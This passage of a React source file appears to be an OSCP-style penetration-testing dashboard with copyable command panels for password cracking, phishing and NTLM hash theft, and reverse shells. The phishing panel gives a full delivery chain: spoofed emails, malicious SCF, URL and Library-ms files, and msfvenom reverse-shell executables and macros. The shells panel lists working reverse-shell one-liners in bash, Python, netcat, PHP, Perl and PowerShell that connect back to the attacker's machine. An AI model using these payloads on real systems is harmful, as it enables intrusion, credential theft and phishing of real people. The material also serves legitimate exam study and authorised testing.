          <input value={kaliPort} onChange={e=>setKaliPort(e.target.value)} onKeyDown={e=>e.key==="Enter"&&apply()} placeholder="443" style={{width:55,background:"rgba(0,0,0,0.4)",border:`1px solid ${kaliPort!==appliedPort?"rgba(255,170,0,0.4)":"rgba(100,130,160,0.15)"}`,borderRadius:3,color:"#88bbdd",fontFamily:mono,fontSize:10,padding:"3px 7px",outline:"none"}}/>
          <button onClick={apply} style={{background:kaliIp!==appliedIp||kaliPort!==appliedPort?"rgba(68,170,255,0.15)":"rgba(68,170,255,0.06)",border:`1px solid ${kaliIp!==appliedIp||kaliPort!==appliedPort?"#44aaff":"rgba(68,170,255,0.15)"}`,color:kaliIp!==appliedIp||kaliPort!==appliedPort?"#44aaff":"#335577",borderRadius:3,padding:"3px 10px",cursor:"pointer",fontSize:9,fontFamily:mono,fontWeight:700}}>APPLY</button>
        </div>
      </div>
      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(400px, 1fr))",gap:0}}>
        {sections.map(sec=>(
          <div key={sec.title} style={{borderRight:"1px solid rgba(100,130,160,0.06)",borderBottom:"1px solid rgba(100,130,160,0.06)"}}>
            <div style={{padding:"6px 10px",background:"rgba(68,170,255,0.03)",borderBottom:"1px solid rgba(68,170,255,0.06)"}}>
              <span style={{fontSize:10,fontWeight:700,fontFamily:mono,color:"#44aaff"}}>{sec.title}</span>
            </div>
            {sec.scenario&&<div style={{padding:"4px 10px",background:"rgba(68,170,255,0.02)",borderBottom:"1px solid rgba(100,130,160,0.04)"}}>
              <span style={{fontSize:9.5,fontFamily:mono,color:"#7799aa",lineHeight:1.5}}>{sec.scenario}</span>
            </div>}
            {sec.items.map(item=>(
              <div key={item.id} style={{display:"flex",alignItems:"flex-start",gap:6,padding:"4px 10px",borderBottom:"1px solid rgba(100,130,160,0.03)"}}>
                <div style={{flex:1,minWidth:0}}>
                  <div style={{fontSize:10.5,fontFamily:mono,color:"#e8edf2",lineHeight:1.4}}>{item.text}</div>
                  {item.cmd&&<div style={{fontSize:10,fontFamily:mono,color:"#6b7f94",lineHeight:1.4,wordBreak:"break-all"}}>{sub(item.cmd)}</div>}
                </div>
                {item.cmd&&<button onClick={()=>copy(item.id,item.cmd)} title="Copy" style={{background:copied===item.id?"rgba(68,170,255,0.15)":"none",border:"none",color:copied===item.id?"#44aaff":"#334455",cursor:"pointer",fontSize:10,padding:"2px 4px",fontFamily:mono,flexShrink:0,marginTop:2}}>{copied===item.id?"✓":"📋"}</button>}
              </div>
            ))}
          </div>
        ))}
      </div>
    </div>
  );
}

// ─── CRACKING REFERENCE PANEL ─────────────────────────────
function CrackingPanel() {
  const [copied,setCopied] = useState(null);
  const copy = (id,cmd) => { if(!cmd)return; navigator.clipboard.writeText(cmd).then(()=>{setCopied(id);setTimeout(()=>setCopied(null),1200)}).catch(()=>{}) };

  const sections = [
    { title: "🔍 HASH IDENTIFICATION", scenario: "Found a hash but don't know what type it is? Use these tools and patterns to identify it before cracking.", items: [
      { id:"hi1", text:"hashid — identifies hash type and suggests hashcat mode", cmd:"hashid -m 'HASH_HERE'" },
      { id:"hi2", text:"hashcat example hashes — match prefix to known formats", cmd:"hashcat --example-hashes | grep -B5 'HASH_PREFIX'" },
      { id:"hi3", text:"hash-identifier — alternative identification tool", cmd:"hash-identifier" },
      { id:"hi4", text:"32 hex chars (no prefix) → MD5 (-m 0) or NTLM (-m 1000)" },
      { id:"hi5", text:"$krb5asrep$23$ → AS-REP Roast (-m 18200)" },
      { id:"hi6", text:"$krb5tgs$23$ → Kerberoast TGS-REP (-m 13100)" },
      { id:"hi7", text:"$6$ → SHA-512 Unix crypt (-m 1800)" },
      { id:"hi8", text:"$2a$ / $2b$ / $2y$ → bcrypt (-m 3200)" },
      { id:"hi9", text:"$1$ → MD5 Unix crypt (-m 500)" },
      { id:"hi10", text:"$5$ → SHA-256 Unix crypt (-m 7400)" },
      { id:"hi11", text:"Username::Domain:Challenge:HMAC:Blob → NTLMv2 (-m 5600)" },
      { id:"hi12", text:"$apr1$ → Apache MD5 (-m 1600)" },
      { id:"hi13", text:"$P$ or $H$ → phpBB / WordPress (-m 400)" },
    ]},
    { title: "🔓 AD & WINDOWS HASHES", scenario: "Hashes captured from SAM dumps, LSASS, Responder, Kerberoasting, or AS-REP Roasting during AD attacks.", items: [
      { id:"aw1", text:"NTLM — from SAM dump, secretsdump, mimikatz (32 hex chars)", cmd:"hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"aw2", text:"NTLMv2 — from Responder capture", cmd:"hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"aw3", text:"AS-REP Roast — $krb5asrep$23$ prefix", cmd:"hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force" },
      { id:"aw4", text:"Kerberoast TGS-REP — $krb5tgs$23$ prefix", cmd:"hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"aw5", text:"Net-NTLMv1 — older systems", cmd:"hashcat -m 5500 ntlmv1.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"aw6", text:"DCC2 / mscash2 — cached domain creds ($DCC2$ prefix)", cmd:"hashcat -m 2100 dcc2.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"aw7", text:"GPP cpassword — decrypt directly, no cracking needed", cmd:"gpp-decrypt 'CPASSWORD_HASH'" },
    ]},
    { title: "🐧 LINUX HASHES", scenario: "Hashes from /etc/shadow, application configs, or database dumps on Linux systems.", items: [
      { id:"lh1", text:"SHA-512 crypt — $6$ prefix (most common modern Linux)", cmd:"hashcat -m 1800 sha512.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"lh2", text:"SHA-256 crypt — $5$ prefix", cmd:"hashcat -m 7400 sha256crypt.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"lh3", text:"MD5 crypt — $1$ prefix (older Linux)", cmd:"hashcat -m 500 md5crypt.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"lh4", text:"bcrypt — $2a$/$2b$/$2y$ prefix (web apps, htpasswd)", cmd:"hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt" },
      { id:"lh5", text:"DES crypt — 13 char, no prefix (very old systems)", cmd:"hashcat -m 1500 des.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"lh6", text:"Apache MD5 — $apr1$ prefix (.htpasswd files)", cmd:"hashcat -m 1600 apache-md5.hash /usr/share/wordlists/rockyou.txt --force" },
    ]},
    { title: "🌐 WEB APPLICATION HASHES", scenario: "Hashes extracted from web app databases — MySQL, PostgreSQL, WordPress, phpBB, Joomla, Drupal, etc.", items: [
      { id:"wh1", text:"MD5 — 32 hex chars, no prefix (basic web apps)", cmd:"hashcat -m 0 md5.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"wh2", text:"SHA-1 — 40 hex chars", cmd:"hashcat -m 100 sha1.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"wh3", text:"SHA-256 — 64 hex chars", cmd:"hashcat -m 1400 sha256.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"wh4", text:"SHA-512 — 128 hex chars", cmd:"hashcat -m 1700 sha512.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"wh5", text:"WordPress / phpBB — $P$ or $H$ prefix", cmd:"hashcat -m 400 wordpress.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"wh6", text:"Drupal 7 — $S$ prefix", cmd:"hashcat -m 7900 drupal.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"wh7", text:"Joomla — MD5 with salt (hash:salt format)", cmd:"hashcat -m 11 joomla.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"wh8", text:"MySQL 4.1+ — starts with * followed by 40 hex", cmd:"hashcat -m 300 mysql.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"wh9", text:"PostgreSQL MD5 — md5 prefix + 32 hex", cmd:"hashcat -m 12 postgres.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"wh10", text:"MSSQL 2012+ — 0x0200 prefix", cmd:"hashcat -m 1731 mssql.hash /usr/share/wordlists/rockyou.txt --force" },
    ]},
    { title: "📦 FILE & ARCHIVE CRACKING", scenario: "Encrypted ZIPs, PDFs, Office docs, 7z files, and other password-protected files found on shares or during enumeration.", items: [
      { id:"fc1", text:"ZIP — fcrackzip (fast, basic encryption only)", cmd:"fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip" },
      { id:"fc2", text:"ZIP — zip2john + john (handles AES-256, always use this)", cmd:"zip2john file.zip > zip.hash && john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
      { id:"fc3", text:"ZIP AES-256 — split hashes if john chokes on multi-entry ZIPs", cmd:"zip2john file.zip > zip.hash && split -l 1 zip.hash hash_ && for f in hash_*; do john --wordlist=/usr/share/wordlists/rockyou.txt \"$f\"; done" },
      { id:"fc4", text:"ZIP — extract with 7z after cracking (NOT unzip for AES)", cmd:"7z x -p'PASSWORD' file.zip" },
      { id:"fc5", text:"RAR — rar2john + john", cmd:"rar2john file.rar > rar.hash && john rar.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
      { id:"fc6", text:"7z — 7z2john + john", cmd:"7z2john.pl file.7z > 7z.hash && john 7z.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
      { id:"fc7", text:"PDF — pdf2john + john", cmd:"pdf2john file.pdf > pdf.hash && john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
      { id:"fc8", text:"Office docs (.doc/.docx/.xls/.xlsx) — office2john + john", cmd:"office2john file.docx > doc.hash && john doc.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
    ]},
    { title: "🔑 KEY & CERTIFICATE CRACKING", scenario: "Encrypted SSH keys, PFX certificates, KeePass databases, and other credential stores found during enumeration.", items: [
      { id:"kc1", text:"SSH private key — ssh2john + john", cmd:"ssh2john id_rsa > ssh.hash && john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
      { id:"kc2", text:"SSH key — hashcat alternative", cmd:"ssh2john id_rsa > ssh.hash && hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"kc3", text:"PFX certificate — pfx2john + john (Timelapse pattern)", cmd:"pfx2john cert.pfx > pfx.hash && john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
      { id:"kc4", text:"KeePass database — keepass2john + john", cmd:"keepass2john Database.kdbx > kp.hash && john kp.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
      { id:"kc5", text:"KeePass — hashcat alternative", cmd:"keepass2john Database.kdbx > kp.hash && hashcat -m 13400 kp.hash /usr/share/wordlists/rockyou.txt --force" },
      { id:"kc6", text:"Firefox saved passwords — decrypt with firefox_decrypt", cmd:"python3 firefox_decrypt.py /path/to/profile/" },
      { id:"kc7", text:"VNC password file — decrypt ~/.vnc/passwd", cmd:"vncpwd ~/.vnc/passwd" },
      { id:"kc8", text:"GPG private key — gpg2john + john", cmd:"gpg2john key.gpg > gpg.hash && john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
    ]},
    { title: "⚡ JOHN THE RIPPER — Quick Reference", scenario: "John alternatives for every hash type. Useful when hashcat GPU isn't available or for file-based cracking.", items: [
      { id:"jr1", text:"Basic john with wordlist", cmd:"john cracked.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
      { id:"jr2", text:"John with rules for better coverage", cmd:"john cracked.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64" },
      { id:"jr3", text:"Force specific format (NTLM)", cmd:"john --format=NT ntlm.hash --wordlist=/usr/share/wordlists/rockyou.txt" },
      { id:"jr4", text:"Show cracked passwords", cmd:"john --show cracked.hash" },
      { id:"jr5", text:"Show cracked with specific format", cmd:"john --show --format=NT ntlm.hash" },
    ]},
    { title: "🎯 WORDLISTS & RULES", scenario: "Maximizing crack success with the right wordlist and rule combinations.", items: [
      { id:"wl1", text:"rockyou.txt — default go-to wordlist", cmd:"/usr/share/wordlists/rockyou.txt" },
      { id:"wl2", text:"Generate custom wordlist from website content", cmd:"cewl http://TARGET > custom.txt && cewl http://TARGET --lowercase >> custom.txt" },
      { id:"wl3", text:"Hashcat with best64 rule (expands wordlist)", cmd:"hashcat -m MODE target.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule" },
      { id:"wl4", text:"Hashcat with OneRuleToRuleThemAll", cmd:"hashcat -m MODE target.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule" },
      { id:"wl5", text:"SecLists probable passwords (smaller, faster)", cmd:"/usr/share/seclists/Passwords/probable-v2-top1575.txt" },
      { id:"wl6", text:"SecLists default credentials", cmd:"/usr/share/seclists/Passwords/Default-Credentials/" },
    ]},
  ];

  return (
    <div style={{borderBottom:"1px solid rgba(255,170,0,0.15)",background:"rgba(0,0,0,0.25)",maxHeight:"70vh",overflowY:"auto"}}>
      <div style={{padding:"8px 14px",display:"flex",justifyContent:"space-between",alignItems:"center",borderBottom:"1px solid rgba(255,170,0,0.08)",position:"sticky",top:0,background:"rgba(10,15,20,0.97)",zIndex:5,flexWrap:"wrap",gap:8}}>
        <span style={{fontSize:12,fontWeight:800,fontFamily:mono,color:"#ffaa00",letterSpacing:1}}>🔓 HASH & FILE CRACKING REFERENCE</span>
        <span style={{fontSize:9,color:"#556677",fontFamily:mono}}>📋 to copy command</span>
      </div>
      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(420px, 1fr))",gap:0}}>
        {sections.map(sec=>(
          <div key={sec.title} style={{borderRight:"1px solid rgba(100,130,160,0.06)",borderBottom:"1px solid rgba(100,130,160,0.06)"}}>
            <div style={{padding:"6px 10px",background:"rgba(255,170,0,0.03)",borderBottom:"1px solid rgba(255,170,0,0.06)"}}>
              <span style={{fontSize:10,fontWeight:700,fontFamily:mono,color:"#ffaa00"}}>{sec.title}</span>
            </div>
            {sec.scenario&&<div style={{padding:"4px 10px",background:"rgba(255,170,0,0.02)",borderBottom:"1px solid rgba(100,130,160,0.04)"}}>
              <span style={{fontSize:9.5,fontFamily:mono,color:"#aa9955",lineHeight:1.5}}>{sec.scenario}</span>
            </div>}
            {sec.items.map(item=>(
              <div key={item.id} style={{display:"flex",alignItems:"flex-start",gap:6,padding:"4px 10px",borderBottom:"1px solid rgba(100,130,160,0.03)"}}>
                <div style={{flex:1,minWidth:0}}>
                  <div style={{fontSize:10.5,fontFamily:mono,color:"#e8edf2",lineHeight:1.4}}>{item.text}</div>
                  {item.cmd&&<div style={{fontSize:10,fontFamily:mono,color:"#6b7f94",lineHeight:1.4,wordBreak:"break-all"}}>{item.cmd}</div>}
                </div>
                {item.cmd&&<button onClick={()=>copy(item.id,item.cmd)} title="Copy" style={{background:copied===item.id?"rgba(255,170,0,0.15)":"none",border:"none",color:copied===item.id?"#ffaa00":"#334455",cursor:"pointer",fontSize:10,padding:"2px 4px",fontFamily:mono,flexShrink:0,marginTop:2}}>{copied===item.id?"✓":"📋"}</button>}
              </div>
            ))}
          </div>
        ))}
      </div>
    </div>
  );
}

// ─── PHISHING & NTLM THEFT PANEL ─────────────────────────
function PhishingPanel() {
  const [copied,setCopied] = useState(null);
  const [kaliIp,setKaliIp] = useState(localStorage.getItem("oscp_kali_ip")||"");
  const [kaliPort,setKaliPort] = useState(localStorage.getItem("oscp_kali_port")||"");
  const [appliedIp,setAppliedIp] = useState(localStorage.getItem("oscp_kali_ip")||"");
  const [appliedPort,setAppliedPort] = useState(localStorage.getItem("oscp_kali_port")||"");
  const apply = () => { setAppliedIp(kaliIp); setAppliedPort(kaliPort); localStorage.setItem("oscp_kali_ip",kaliIp); localStorage.setItem("oscp_kali_port",kaliPort) };
  const sub = cmd => {
    if (!cmd) return "";let t = cmd;
    if (appliedIp) t = t.replace(/KALI/g, appliedIp);
    if (appliedPort) t = t.replace(/\b443\b/g, appliedPort).replace(/\b4444\b/g, appliedPort);
    return t;
  };
  const copy = (id,cmd) => { if(!cmd)return; navigator.clipboard.writeText(sub(cmd)).then(()=>{setCopied(id);setTimeout(()=>setCopied(null),1200)}).catch(()=>{}) };

  const sections = [
    { title: "🎣 RESPONDER — NTLM HASH CAPTURE", scenario: "You found a URL input field, SSRF, MSSQL access, writable SMB share, or any way to force a target to authenticate back to you. Start Responder first, then trigger auth from the target.", items: [
      { id:"r1", text:"Start Responder on tun0 — captures NTLMv2 hashes from any auth attempt", cmd:"sudo responder -I tun0" },
      { id:"r2", text:"Crack captured NTLMv2 hash with hashcat", cmd:"hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt" },
      { id:"r3", text:"Crack with john as alternative", cmd:"john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt" },
    ]},
    { title: "🔗 NTLM THEFT TRIGGERS — Force Auth to Responder", scenario: "These are the different ways to make a target machine authenticate back to your Responder. Use whichever matches the attack surface you have.", items: [
      { id:"t1", text:"MSSQL xp_dirtree — trigger from SQL access", cmd:"EXEC xp_dirtree '\\\\KALI\\share';" },
      { id:"t2", text:"MSSQL xp_fileexist — alternative trigger", cmd:"EXEC xp_fileexist '\\\\KALI\\share\\test';" },
      { id:"t3", text:"SSRF / URL input field — submit attacker URL", cmd:"http://KALI/steal" },
      { id:"t4", text:"SSRF to UNC path — force SMB auth from web app", cmd:"\\\\KALI\\share" },
      { id:"t5", text:"XXE with UNC path — force auth through XML injection", cmd:"<!DOCTYPE foo [<!ENTITY xxe SYSTEM '\\\\KALI\\share'>]>" },
    ]},
    { title: "📁 NTLM THEFT FILES — Upload to Writable Shares", scenario: "You found a writable SMB share or FTP that users browse. Generate malicious files that auto-authenticate to your Responder when a user opens the folder. Works on writable SYSVOL or any browsed share.", items: [
      { id:"n1", text:"Generate ALL ntlm_theft file types at once", cmd:"python3 ntlm_theft.py -g all -s KALI -f evil" },
      { id:"n2", text:"Upload all generated files to writable SMB share", cmd:"smbclient //TARGET/share -U 'user%pass' -c 'prompt off; mput evil*'" },
      { id:"n3", text:"Upload via FTP if FTP is writable", cmd:"ftp TARGET\nbinary\nmput evil*" },
      { id:"n4", text:"Manual SCF file — create if ntlm_theft unavailable", cmd:"echo '[Shell]\\nCommand=2\\nIconFile=\\\\KALI\\share\\icon.ico\\n[Taskbar]\\nCommand=ToggleDesktop' > evil.scf" },
      { id:"n5", text:"Manual URL file — alternative to SCF", cmd:"echo '[InternetShortcut]\\nURL=http://KALI/steal\\nIconFile=\\\\KALI\\share\\icon.ico\\nIconIndex=0' > evil.url" },
    ]},
    { title: "📧 PHISHING VIA SMTP — Email Delivery", scenario: "SMTP port 25 is open on a target and you can send emails to internal users. Deliver payloads via email using SWAKS. Works when you have usernames from LDAP/SMB enum. Common in AD environments with SMTP access.", items: [
      { id:"s1", text:"Send email with attachment via SWAKS", cmd:"swaks -t victim@domain.local --from admin@domain.local --server TARGET --header 'Subject: Urgent Update' --body 'Please review the attached file' --attach @payload.txt" },
      { id:"s2", text:"Send email with HTML body containing UNC path for NTLM theft", cmd:"swaks -t victim@domain.local --from admin@domain.local --server TARGET --header 'Subject: Report' --body '<html><img src=\"\\\\KALI\\share\\img.png\"></html>' --header 'Content-Type: text/html'" },
      { id:"s3", text:"Send Library-ms file for WebDAV shell callback (see WebDAV section below)", cmd:"swaks -t victim@domain.local --from admin@domain.local --server TARGET --header 'Subject: Shared Folder' --attach @config.Library-ms" },
    ]},
    { title: "📂 WEBDAV + LIBRARY FILE PHISHING", scenario: "Full phishing chain: host a WebDAV share with a malicious .lnk, create a Library-ms file pointing to it, email the Library-ms to a user. When opened, they see your WebDAV as a folder and click the .lnk which runs your reverse shell. Common in AD environments with SMTP access.", items: [
      { id:"w1", text:"Step 1: Start WebDAV server hosting your payloads", cmd:"wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav/" },
      { id:"w2", text:"Step 2: Create config.Library-ms file (paste XML with your IP)", cmd:"<?xml version=\"1.0\"?>\\n<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">\\n<searchConnectorDescriptionList>\\n<searchConnectorDescription>\\n<simpleLocation>\\n<url>http://KALI</url>\\n</simpleLocation>\\n</searchConnectorDescription>\\n</searchConnectorDescriptionList>\\n</libraryDescription>" },
      { id:"w3", text:"Step 3: Generate reverse shell exe for the .lnk to execute", cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe -o webdav/install.exe" },
      { id:"w4", text:"Step 4: Create install.lnk in webdav/ that runs install.exe (use PowerShell or msfvenom shortcut)", cmd:"powershell -c \"$s=New-Object -COM WScript.Shell;$sc=$s.CreateShortcut('webdav\\install.lnk');$sc.TargetPath='C:\\Windows\\System32\\cmd.exe';$sc.Arguments='/c \\\\KALI\\install.exe';$sc.Save()\"" },
      { id:"w5", text:"Step 5: Start listener, then email the Library-ms via SWAKS", cmd:"swaks -t victim@domain.local --from admin@domain.local --server SMTP_TARGET --header 'Subject: Shared Folder' --attach @config.Library-ms" },
    ]},
    { title: "📄 MACRO PAYLOADS — Office Documents", scenario: "Target opens Word/Excel docs. Create a macro-enabled document (.doc/.docm/.odt) with an embedded reverse shell. Deliver via email or writable share. Common when targets open Office documents.", items: [
      { id:"m1", text:"Generate HTA payload for macro to download and execute", cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f hta-psh -o evil.hta" },
      { id:"m2", text:"Generate raw PowerShell payload for macro embedding", cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f ps1 -o payload.ps1" },
      { id:"m3", text:"Host payload on HTTP server, macro downloads and executes", cmd:"python3 -m http.server 80" },
      { id:"m4", text:"Send doc via email with SWAKS", cmd:"swaks -t victim@domain.local --from admin@domain.local --server TARGET --header 'Subject: Q3 Report' --attach @evil.docm" },
      { id:"m5", text:"LibreOffice ODS macro delivery via sendemail", cmd:"sendemail -f admin@domain.local -t victim@domain.local -s TARGET:25 -u 'Spreadsheet' -m 'Please review' -a exploit.ods" },
    ]},
  ];

  return (
    <div style={{borderBottom:"1px solid rgba(255,100,100,0.15)",background:"rgba(0,0,0,0.25)",maxHeight:"70vh",overflowY:"auto"}}>
      <div style={{padding:"8px 14px",display:"flex",justifyContent:"space-between",alignItems:"center",borderBottom:"1px solid rgba(255,100,100,0.08)",position:"sticky",top:0,background:"rgba(10,15,20,0.97)",zIndex:5,flexWrap:"wrap",gap:8}}>
        <span style={{fontSize:12,fontWeight:800,fontFamily:mono,color:"#ff6666",letterSpacing:1}}>🎣 PHISHING & NTLM THEFT REFERENCE</span>
        <div style={{display:"flex",alignItems:"center",gap:8}}>
          <span style={{fontSize:9,color:"#556677",fontFamily:mono}}>KALI IP:</span>
          <input value={kaliIp} onChange={e=>setKaliIp(e.target.value)} onKeyDown={e=>e.key==="Enter"&&apply()} placeholder="10.10.14.x" style={{width:110,background:"rgba(0,0,0,0.4)",border:`1px solid ${kaliIp!==appliedIp?"rgba(255,170,0,0.4)":"rgba(255,100,100,0.2)"}`,borderRadius:3,color:"#ff6666",fontFamily:mono,fontSize:10,padding:"3px 7px",outline:"none"}}/>
          <span style={{fontSize:9,color:"#556677",fontFamily:mono}}>PORT:</span>
          <input value={kaliPort} onChange={e=>setKaliPort(e.target.value)} onKeyDown={e=>e.key==="Enter"&&apply()} placeholder="443" style={{width:55,background:"rgba(0,0,0,0.4)",border:`1px solid ${kaliPort!==appliedPort?"rgba(255,170,0,0.4)":"rgba(100,130,160,0.15)"}`,borderRadius:3,color:"#88bbdd",fontFamily:mono,fontSize:10,padding:"3px 7px",outline:"none"}}/>
          <button onClick={apply} style={{background:kaliIp!==appliedIp||kaliPort!==appliedPort?"rgba(255,100,100,0.15)":"rgba(255,100,100,0.06)",border:`1px solid ${kaliIp!==appliedIp||kaliPort!==appliedPort?"#ff6666":"rgba(255,100,100,0.15)"}`,color:kaliIp!==appliedIp||kaliPort!==appliedPort?"#ff6666":"#663333",borderRadius:3,padding:"3px 10px",cursor:"pointer",fontSize:9,fontFamily:mono,fontWeight:700}}>APPLY</button>
        </div>
      </div>
      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(420px, 1fr))",gap:0}}>
        {sections.map(sec=>(
          <div key={sec.title} style={{borderRight:"1px solid rgba(100,130,160,0.06)",borderBottom:"1px solid rgba(100,130,160,0.06)"}}>
            <div style={{padding:"6px 10px",background:"rgba(255,100,100,0.03)",borderBottom:"1px solid rgba(255,100,100,0.06)"}}>
              <span style={{fontSize:10,fontWeight:700,fontFamily:mono,color:"#ff6666"}}>{sec.title}</span>
            </div>
            {sec.scenario&&<div style={{padding:"4px 10px",background:"rgba(255,170,0,0.02)",borderBottom:"1px solid rgba(100,130,160,0.04)"}}>
              <span style={{fontSize:9.5,fontFamily:mono,color:"#aa9955",lineHeight:1.5}}>{sec.scenario}</span>
            </div>}
            {sec.items.map(item=>(
              <div key={item.id} style={{display:"flex",alignItems:"flex-start",gap:6,padding:"4px 10px",borderBottom:"1px solid rgba(100,130,160,0.03)"}}>
                <div style={{flex:1,minWidth:0}}>
                  <div style={{fontSize:10.5,fontFamily:mono,color:"#e8edf2",lineHeight:1.4}}>{item.text}</div>
                  <div style={{fontSize:10,fontFamily:mono,color:"#6b7f94",lineHeight:1.4,wordBreak:"break-all"}}>{item.cmd&&sub(item.cmd)}</div>
                </div>
                <button onClick={()=>copy(item.id,item.cmd)} title="Copy" style={{background:copied===item.id?"rgba(255,100,100,0.15)":"none",border:"none",color:copied===item.id?"#ff6666":"#334455",cursor:"pointer",fontSize:10,padding:"2px 4px",fontFamily:mono,flexShrink:0,marginTop:2}}>{copied===item.id?"✓":"📋"}</button>
              </div>
            ))}
          </div>
        ))}
      </div>
    </div>
  );
}

// ─── SHELLS REFERENCE PANEL ──────────────────────────────
function ShellsPanel() {
  const [copied,setCopied] = useState(null);
  const [kaliIp,setKaliIp] = useState(localStorage.getItem("oscp_kali_ip")||"");
  const [kaliPort,setKaliPort] = useState(localStorage.getItem("oscp_kali_port")||"");
  const [appliedIp,setAppliedIp] = useState(localStorage.getItem("oscp_kali_ip")||"");
  const [appliedPort,setAppliedPort] = useState(localStorage.getItem("oscp_kali_port")||"");
  const apply = () => { setAppliedIp(kaliIp); setAppliedPort(kaliPort); localStorage.setItem("oscp_kali_ip",kaliIp); localStorage.setItem("oscp_kali_port",kaliPort) };
  const sub = cmd => {
    if (!cmd) return "";let t = cmd;
    if (appliedIp) t = t.replace(/KALI/g, appliedIp);
    if (appliedPort) t = t.replace(/\b443\b/g, appliedPort).replace(/\b4444\b/g, appliedPort);
    return t;
  };
  const copy = (id,cmd) => { if(!cmd)return; navigator.clipboard.writeText(sub(cmd)).then(()=>{setCopied(id);setTimeout(()=>setCopied(null),1200)}).catch(()=>{}) };
  const sections = [
    { title: "🎧 LISTENERS", items: [
      { id:"li1", text:"Netcat listener (basic)", cmd:"nc -lvnp 443" },
      { id:"li2", text:"Rlwrap netcat — arrow keys + history", cmd:"rlwrap nc -lvnp 443" },
      { id:"li3", text:"Penelope — auto-upgrade, logging, transfers", cmd:"sudo python3 penelope.py 443" },
      { id:"li4", text:"Socat encrypted listener", cmd:"socat -d -d OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork STDOUT" },
    ]},
    { title: "🐧 LINUX REVERSE SHELLS", items: [
      { id:"lr1", text:"Bash — most reliable Linux rev shell", cmd:"bash -i >& /dev/tcp/KALI/443 0>&1" },
      { id:"lr2", text:"Bash wrapped — when bash -i alone fails", cmd:"bash -c 'bash -i >& /dev/tcp/KALI/443 0>&1'" },
      { id:"lr3", text:"Python3 — common on web servers", cmd:"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"KALI\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/bash\",\"-i\"])'" },
      { id:"lr4", text:"Netcat with -e flag", cmd:"nc KALI 443 -e /bin/bash" },
      { id:"lr5", text:"Netcat mkfifo — when -e unavailable", cmd:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc KALI 443 >/tmp/f" },
      { id:"lr6", text:"PHP — for web server cmd injection", cmd:"php -r '$sock=fsockopen(\"KALI\",443);exec(\"/bin/bash <&3 >&3 2>&3\");'" },
      { id:"lr7", text:"Perl — fallback on older systems", cmd:"perl -e 'use Socket;$i=\"KALI\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'" },
    ]},
    { title: "🪟 WINDOWS REVERSE SHELLS", items: [
      { id:"wr1", text:"PowerShell base64 — most common on OSCP", cmd:"powershell -e BASE64_PAYLOAD" },
      { id:"wr2", text:"PowerShell one-liner — no encoding needed", cmd:"powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('KALI',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"" },
      { id:"wr3", text:"Netcat — if nc.exe on target", cmd:"nc.exe KALI 443 -e cmd.exe" },
